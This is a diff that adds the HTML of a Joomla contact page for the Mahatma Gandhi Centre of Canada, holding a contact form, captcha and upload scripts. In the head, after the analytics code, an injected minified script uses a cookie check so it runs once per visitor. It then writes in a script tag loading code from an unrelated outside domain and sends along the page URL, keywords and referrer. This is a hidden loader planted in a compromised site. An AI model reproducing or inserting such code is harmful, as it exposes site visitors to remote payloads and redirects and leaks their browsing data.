@@ -1,0 +1,397 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" dir="ltr" >
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="mahatma, gandhi, centre, canada, manitoba, winnipeg" />
+  <meta name="description" content="Mahatma Gandhi Centre of Canada Inc" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>gandhicentre.ca</title>
+  <link rel="stylesheet" href="http://www.gandhicentre.ca/components/com_aicontactsafe/includes/css/aicontactsafe_general.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.gandhicentre.ca/media/aicontactsafe/cssprofiles/profile_css_1.css" type="text/css" />
+  <script type="text/javascript" src="/includes/js/joomla.javascript.js"></script>
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript">
+
+	//<![CDATA[
+	<!--
+	function resetSubmit( pf ) {
+		$('adminForm_'+pf).addEvent('submit', function(e) {
+			new Event(e).stop();
+			this.send({
+				onRequest: function(){ 
+										document.getElementById('adminForm_'+pf).elements['task'].value = 'ajaxform'; 
+										document.getElementById('adminForm_'+pf).elements['use_ajax'].value = '1';
+										$('aiContactSafeSend_loading_'+pf).setHTML('&nbsp;&nbsp;Please wait ...&nbsp;<img id="imgLoading" border="0" src="http://www.gandhicentre.ca/components/com_aicontactsafe/includes/images/load.gif" />&nbsp;&nbsp;');
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].disabled = true;
+									},
+				onComplete: function() { 
+										$('displayAiContactSafeForm_'+pf).setHTML( this.response.text );
+										changeCaptcha(pf,0); 
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].removeAttribute('disabled');
+										if (document.getElementById('adminForm_'+pf).elements['ajax_return_to']) {
+											var ajax_return_to = document.getElementById('adminForm_'+pf).elements['ajax_return_to'].value;
+											if (ajax_return_to.length > 0) {
+												window.location = ajax_return_to;
+											}
+										} else {
+											if (document.getElementById('adminForm_'+pf).elements['ajax_message_sent']) {
+												var return_to = document.getElementById('adminForm_'+pf).elements['return_to'].value;
+												return_to = return_to.replace('&#38;', '&');
+												var current_url = document.getElementById('adminForm_'+pf).elements['current_url'].value;
+												current_url = current_url.replace('&#38;', '&');
+												if (return_to.length > 0 && return_to != current_url) {													
+													window.location = return_to;
+												}
+											}
+										}
+										$('aiContactSafeSend_loading_'+pf).setHTML('&nbsp;');
+										setupCalendars(pf);
+									}
+			});
+		});
+	}
+	function checkEditboxLimit( pf, editbox_id, chars_limit ){
+		if (document.getElementById('adminForm_'+pf).elements[editbox_id]) {
+			if (document.getElementById('adminForm_'+pf).elements[editbox_id].value.length > chars_limit) {
+				alert('Maximum characters exceeded !');
+				document.getElementById('adminForm_'+pf).elements[editbox_id].value = document.getElementById('adminForm_'+pf).elements[editbox_id].value.substring(0,chars_limit);
+			} else {
+				if (document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id]) {
+					document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id].value = chars_limit - document.getElementById('adminForm_'+pf).elements[editbox_id].value.length;
+				}
+			}
+		}
+	}
+	function changeCaptcha( pf, modifyFocus ) {
+		if (document.getElementById('div_captcha_img_'+pf)) {
+			var set_rand = Math.floor(Math.random()*10000000001);
+			var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+			var captcha_file = 'http://www.gandhicentre.ca/index.php?option=com_aicontactsafe&sTask=captcha&task=captcha&pf='+pf+'&r_id='+r_id+'&lang=&format=raw&set_rand='+set_rand;
+			if (window.ie6) {
+				var url = 'http://www.gandhicentre.ca/index.php?option=com_aicontactsafe&sTask=captcha&task=newCaptcha&pf='+pf+'&r_id='+r_id+'&lang=&format=raw&set_rand='+set_rand;
+				new Ajax(url, {
+					method: 'get',
+					update: $('div_captcha_img_'+pf),
+					onRequest: function(){ $('div_captcha_img_'+pf).setHTML('Please wait ...'); }
+				}).request();
+			} else {
+				$('div_captcha_img_'+pf).setHTML( '<img src="'+captcha_file+'" alt="&nbsp;" id="captcha" border="0" />' );
+			}
+			if (modifyFocus && document.getElementById('captcha-code')) {
+				document.getElementById('captcha-code').focus();
+			}
+		}
+		if (document.getElementById('captcha-code')) {
+			$('captcha-code').value = '';
+		} else if (document.getElementById('captcha_code')) {
+			$('captcha_code').value = '';
+		} else if (document.getElementById('mathguard_answer')) {
+			$('mathguard_answer').value = '';
+		} else if (document.getElementById('recaptcha_response_field')) {
+			$('recaptcha_response_field').value = '';
+		}
+	}
+	function setDate( pf, newDate, idDate ) {
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = newDate.substr(8,2);
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			var selMonth = newDate.substr(5,2);
+			if(selMonth.substr(0,1) == '0') {
+				selMonth = selMonth.substr(1,1);
+			}
+			selMonth = parseInt(selMonth) - 1;
+			document.getElementById('adminForm_'+pf).elements['month_'+idDate].options[selMonth].selected = true;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['year_'+idDate].value = newDate.substr(0,4);
+		}
+	}
+	function daysInFebruary( year ){
+		var days = (((year % 4 == 0) && ( (!(year % 100 == 0)) || (year % 400 == 0))) ? 29 : 28 );
+		return days;
+	}
+	function daysInMonth( month, year ) {
+		var days = 31;
+		switch( true ) {
+			case month == 2 :
+				days = daysInFebruary( year );
+				break;
+			case month == 4 || month == 6 || month == 9 || month == 11 :
+				days = 30;
+				break;
+		}
+	   return days;
+	}
+	function checkDate( pf, idDate ) {
+		var year = 0;
+		var month = 0;
+		var day = 0;
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			year = document.getElementById('adminForm_'+pf).elements['year_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			month = document.getElementById('adminForm_'+pf).elements['month_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			day = document.getElementById('adminForm_'+pf).elements['day_'+idDate].value;
+		}
+		if (day > 0 && month > 0 && year > 0) {
+			var days = daysInMonth( month, year );
+			if (day > days) {
+				day = days;
+				document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = days;
+				var error = 'Only %days% days in the selected month ! Please set the month first.';
+				alert( error.replace( '%days%', days ) );
+			}
+		}
+		if (document.getElementById('adminForm_'+pf).elements[idDate]) {
+			document.getElementById('adminForm_'+pf).elements[idDate].value = year+'-'+month+'-'+day;
+		}
+	}
+	function clickCheckBox( pf, idTag, ckChecked ) {
+		document.getElementById('adminForm_'+pf).elements[idTag].value = ckChecked?1:0;
+	}
+	function hideUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function resetUploadField(file_field, pf) {
+		var var_file_field = "'"+file_field+"'";
+		$('upload_'+pf+'_file_'+file_field).setHTML('<input type="file" name="'+file_field+'" id="'+file_field+'" onchange="startUploadFile('+var_file_field+','+pf+')" />');
+	}
+	function hideFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function hideWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function cancelUploadFile(file_field, pf) {
+		hideFileField(file_field, pf);
+		deleteUploadedFile(file_field, pf);
+		$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = '';
+		$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = '';
+		resetUploadField(file_field, pf);
+		showUploadField(file_field, pf);
+	}
+	function deleteUploadedFile(file_field, pf) {
+		var file_name = $('adminForm_'+pf).elements[file_field+'_attachment_name'].value;
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		var url = 'http://www.gandhicentre.ca/index.php?option=com_aicontactsafe&sTask=message&task=deleteUploadedFile&filename='+file_name+'&r_id='+r_id+'&format=raw'
+		new Ajax(url, { method: 'get' }).request();
+	}
+	function startUploadFile(file_field, pf) {
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		$('adminForm_'+pf).setProperty('action','index.php?option=com_aicontactsafe&field='+file_field+'&r_id='+r_id+'&format=raw');
+		$('adminForm_'+pf).setProperty('target','iframe_upload_file_'+pf+'_file_'+file_field);
+		$('adminForm_'+pf).elements['task'].value = 'uploadFile';
+		hideUploadField(file_field, pf);
+		hideFileField(file_field, pf);
+		showWaitFileField(file_field, pf);
+		$('adminForm_'+pf).submit();
+		resetUploadField(file_field, pf);
+	}
+	function endUploadFile(pf, file_field, attachment_name, attachment_id, error_type, error_message) {
+		error_type = parseInt(error_type);
+		hideWaitFileField(file_field, pf);
+		switch( error_type ) {
+			case 0 :
+				$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = attachment_name;
+				$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = attachment_id;
+				showFileField(file_field, pf);
+				break;
+			case 1 :
+				alert('This type of attachement is not allowed ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 2 :
+				alert('File to big ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 3 :
+				alert('Other error ! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+		}
+		resetSendButtonTarget(pf);
+	}
+	function resetSendButtonTarget(pf) {
+		$('adminForm_'+pf).setProperty('action','index.php');
+		$('adminForm_'+pf).setProperty('target','_self');
+		$('adminForm_'+pf).elements['task'].value = 'message';
+	}
+	function setupCalendars(pf) {
+		var calendars_imgs = $$('#adminForm_'+pf+' img.calendar');
+		var countCalendars = calendars_imgs.length;
+		for(var i=0;i<countCalendars;i++) {
+			var imgid = calendars_imgs[i].getProperty('id');
+			if (imgid.substr(imgid.length-4)=='_img') {
+				fieldid = imgid.substr(0,imgid.length-4);
+				Calendar.setup({inputField : fieldid, ifFormat: "%Y-%m-%d", button : imgid, align : "Tl", singleClick : true});
+			}
+		}
+	}
+	//-->
+	//]]>
+
+			//<![CDATA[
+			<!--
+			window.addEvent('load', function() {
+				changeCaptcha(1,0);
+resetSubmit(1);
+
+			});
+			//-->
+			//]]>
+		
+  </script>
+
+<link rel="stylesheet" href="/templates/theme416/css/constant.css" type="text/css" />
+<link rel="stylesheet" href="/templates/theme416/css/template.css" type="text/css" />
+<!--[if IE 6]>
+	<script type="text/javascript" src="/templates/theme416/scripts/ie_png.js"></script>
+    <script type="text/javascript">
+       ie_png.fix('.png');
+   </script>
+<![endif]-->
+
+<!--cufon-->
+<script type="text/javascript" src="/templates/theme416/scripts/cufon-yui.js"></script>
+<script type="text/javascript" src="/templates/theme416/scripts/cufon-replace.js"></script>
+<!--end cufon-->
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-10405084-5']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://vasha-mebel.kiev.ua/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
+</head>
+<body id="body">
+	<div class="main">
+        	<div id="header" >
+                <div class="indent-header">
+                    <div id="mid">
+                        <div class="width-search">
+                        	<div class="block-search">
+                                		<div class="moduletable">
+					<form action="index.php" method="post">
+	<div class="search">
+		<div class="search-input"><input name="searchword" id="mod_search_searchword" maxlength="20" alt="Search" class="inputbox" type="text" size="20" value="search..."  onblur="if(this.value=='') this.value='search...';" onfocus="if(this.value=='search...') this.value='';" /></div><div class="search-button">	</div></div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+</form>		</div>
+	
+                                <div class="clear"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div id="top">
+                        <div id="slogan_block">
+                            <div>
+<div><img src="/images/stories/custom_text.gif" border="0" width="674" height="55" /></div>
+<div><a href="/index.php?option=com_content&amp;view=article&amp;id=50" target="_self" title="About Mahatma Gandhi Centre of Canada"><img src="/images/stories/custom_text_2.gif" border="0" style="border: 0;" /></a> <a href="/index.php?option=com_content&amp;view=article&amp;id=6" target="_self" title="Articles - Mahatma Gandhi Centre of Canada"><img src="/images/stories/custom_text_3.gif" border="0" /></a> <a href="/index.php?option=com_oziogallery2&amp;view=02flashgallery&amp;Itemid=59" target="_self" title="Picture Gallery - Mahatma Gandhi Centre of Canada"><img src="/images/stories/custom_text_4.gif" border="0" /></a> <a href="/index.php?option=com_gcalendar&amp;view=gcalendar&amp;Itemid=60#year=2012&amp;month=9&amp;day=26&amp;view=month" target="_self" title="Events Calendar"><img src="/images/stories/custom_text_5.gif" border="0" /></a> <a href="/index.php?option=com_aicontactsafe&amp;view=message&amp;layout=message&amp;pf=1" target="_self" title="Contact Us"><img src="/images/stories/custom_text_6.gif" border="0" /></a></div>
+</div>
+                        </div>
+                        <div id="logo">
+                            <a href="/index.php"><img src="/templates/theme416/images/logo_t.png" alt="" /></a>
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+        <div id="wrapper">
+            <div class="main">
+            	<div class="indent-main">
+					                    <div id="left">
+                        <div class="space">
+                            <div class="width">
+                                		<div class="module_menu">
+        	<div class="moduleTopBg">
+            	<div class="moduleBottomBg">
+					                        <h3><span>Centre Info</span></h3>
+                                         <div class="boxIndent">
+                        <div class="width">
+                            <ul class="menu"><li class="item1"><a href="http://www.gandhicentre.ca/"><span>Home</span></a></li><li class="parent item37"><a href="/index.php?option=com_content&amp;view=article&amp;id=50&amp;Itemid=37"><span>About Us</span></a></li><li class="item54"><a href="/index.php?option=com_content&amp;view=article&amp;id=46&amp;Itemid=54"><span>Constitution/By-Laws</span></a></li><li class="item14"><a href="/index.php?option=com_content&amp;view=article&amp;id=44&amp;Itemid=14"><span>Management Committee</span></a></li><li class="item56"><a href="/index.php?option=com_content&amp;view=article&amp;id=6&amp;Itemid=56"><span>Articles</span></a></li><li class="item60"><a href="/index.php?option=com_gcalendar&amp;view=google&amp;Itemid=60"><span>Events Calendar</span></a></li><li class="item59"><a href="/index.php?option=com_oziogallery2&amp;view=02flashgallery&amp;Itemid=59"><span>Photo Gallery</span></a></li><li class="item16"><a href="/index.php?option=com_content&amp;view=article&amp;id=26&amp;Itemid=16"><span>Awards</span></a></li><li class="item57"><a href="/index.php?option=com_aicontactsafe&amp;view=message&amp;layout=message&amp;pf=1&amp;Itemid=57"><span>Contact Us</span></a></li></ul>                        </div>
+                    </div>
+                </div>
+            </div>
+		</div>
+	
+                            </div>
+                        </div>
+                    </div>
+                    					<div class="container">
+                        <div class="indent-container">
+                                                        
+<div class="aiContactSafe" id="aiContactSafe_mainbody_1">
+<div class="contentpaneopen">
+			<table id="aiContactSafeForm" border="0" cellpadding="0" cellspacing="5">
+				<tr>
+					<td valign="top" style="width:400px;" >
+							<form action="index.php" method="post" id="adminForm_1" name="adminForm_1" enctype="multipart/form-data">		<div id="displayAiContactSafeForm_1">
+				<div class="aiContactSafe" id="aiContactSafe_contact_form">
+				<div class="aiContactSafe" id="aiContactSafe_info">Fields marked with * are required.</div>
+										<div class="aiContactSafe_row" id="aiContactSafe_row_aics_name"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_name" ><label for="aics_name" >Name</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_name" id="aics_name"  class='textbox' value="" /></div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_email"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_email" ><label for="aics_email" >Email</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><input type="text" name="aics_email" id="aics_email"  class='email' value="" /></div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_message"><div class="aiContactSafe_contact_form_field_label_left"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_message" ><label for="aics_message" >Message</label></span>&nbsp;<label class="required_field">*</label></div><div class="aiContactSafe_contact_form_field_right"><textarea name="aics_message" id="aics_message" cols="40" rows="10" class='editbox' onkeydown="checkEditboxLimit(1,'aics_message', 500)" onkeyup="checkEditboxLimit(1,'aics_message',500)" onchange="checkEditboxLimit(1,'aics_message',500)"></textarea><br /><div class="countdown_div">You have<input type="text" readonly="readonly" class="countdown_editbox" name="countdown_aics_message" id="countdown_aics_message" size="3" value="500" />characters left.</div></div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_send_to_sender"><div class="aiContactSafe_contact_form_field_left"><input type="checkbox" name="aics_send_to_sender" id="aics_send_to_sender" class='checkbox'  /></div><div class="aiContactSafe_contact_form_field_label_right"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_send_to_sender" ><label for="aics_send_to_sender" >Send a copy of this message to yourself</label></span>&nbsp;</div></div>
+									<div class="aiContactSafe_row" id="aiContactSafe_row_aics_Attachment"><div class="aiContactSafe_contact_form_field_left"><div id="upload_1_file_aics_Attachment" style="display:inline"><input type="file" name="aics_Attachment" id="aics_Attachment"  onchange="startUploadFile('aics_Attachment',1)" /></div><div id="cancel_upload_1_file_aics_Attachment" style="display:none"><input type="text" name="aics_Attachment_attachment_name" id="aics_Attachment_attachment_name"  value="" readonly="readonly" /><input type="button" name="aics_Attachment_attachment_cancel" id="aics_Attachment_attachment_cancel" value="Cancel" onclick="cancelUploadFile('aics_Attachment', 1);" /></div><input type="hidden" name="aics_Attachment_attachment_id" id="aics_Attachment_attachment_id" value="" /><div id="wait_upload_1_file_aics_Attachment" style="display:none" ><img id="imgLoading_aics_Attachment" border="0" src="http://www.gandhicentre.ca/components/com_aicontactsafe/includes/images/load.gif" />&nbsp;&nbsp;Please wait ...</div><iframe id="iframe_upload_file_1_file_aics_Attachment" name="iframe_upload_file_1_file_aics_Attachment" src="http://www.gandhicentre.ca/components/com_aicontactsafe/index.html" style="width:0;height:0;border:0px solid #FFF;display:none;"></iframe></div><div class="aiContactSafe_contact_form_field_label_right"><span class="aiContactSafe_label" id="aiContactSafe_label_aics_Attachment" ><label for="aics_Attachment" >Attach a file</label></span>&nbsp;</div></div>
+					</div>
+					</div>
+			<br clear="all" />
+								<div id="div_captcha">
+						<div id="div_captcha_info">Please enter the following security code:</div>
+						<div id="div_captcha_img"><div id="div_captcha_img_1" style="width:300px;height:55px;">...</div></div>
+						<div id="div_captcha_new">
+							<a href="javascript:void(0);" onclick="changeCaptcha(1,1);"
+								id="change-image">Not readable? Change text.</a>
+						</div>
+						<div style="margin-top:5px;" id="div_captcha_code"><input type="text" name="captcha-code" id="captcha-code" /></div>
+					</div>
+								<br clear="all" />
+			<div id="aiContactSafeBtns"><div id="aiContactSafeButtons_left" style="clear:both; display:block; width:100%; text-align:left;"><div id="aiContactSafeSend" style="float:left;"><div id="aiContactSafeSend_loading_1" style="float:left; margin:2px;">&nbsp;</div><input type="submit" id="aiContactSafeSendButton" value="Send" style="float:left; margin:2px;" /></div></div></div>
+			<br clear="all" />
+		<input type="hidden" id="option" name="option" value="com_aicontactsafe" /><input type="hidden" id="sTask" name="sTask" value="message" /><input type="hidden" id="task" name="task" value="display" /><input type="hidden" id="send_mail" name="send_mail" value="1" /><input type="hidden" id="pf" name="pf" value="1" /><input type="hidden" id="return_to" name="return_to" value="http://www.gandhicentre.ca/index.php?option=com_aicontactsafe" /><input type="hidden" id="current_url" name="current_url" value="http://www.gandhicentre.ca/index.php?option=com_aicontactsafe" /><input type="hidden" id="Itemid" name="Itemid" value="0" /><input type="hidden" id="lang" name="lang" value="" /><input type="hidden" id="back_button" name="back_button" value="0" /><input type="hidden" id="boxchecked" name="boxchecked" value="0" /><input type="hidden" id="use_ajax" name="use_ajax" value="1" /><input type="hidden" id="r_id" name="r_id" value="510598844" /><input type="hidden" name="13af48ef15eb3c730fc1474c313e96e0" value="1" /></form>						</td>
+					<td valign="top"  ></td>
+				</tr>
+			</table>
+	</div>
+</div>
+                        </div>
+                    </div>
+                    <div class="clear"></div>
+                </div>
+            </div>
+        </div>
+    <div id="footer" class="png">
+    	<div class="main">
+            <div class="space"> 
+                <div class="indent-footer">
+					<div class="copyright">All rights reserved by Mahatma Gandhi Centre of Canada Inc&nbsp;<!--{%FOOTER_LINK} --></div>
+					<div class="copyright">Website Designed by <span><a href="http://www.cainics.com">CAINICS Inc</a></span>&nbsp;<!--{%FOOTER_LINK} --></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    	
+<script type="text/javascript"> Cufon.now(); </script>
+</body>
+</html>
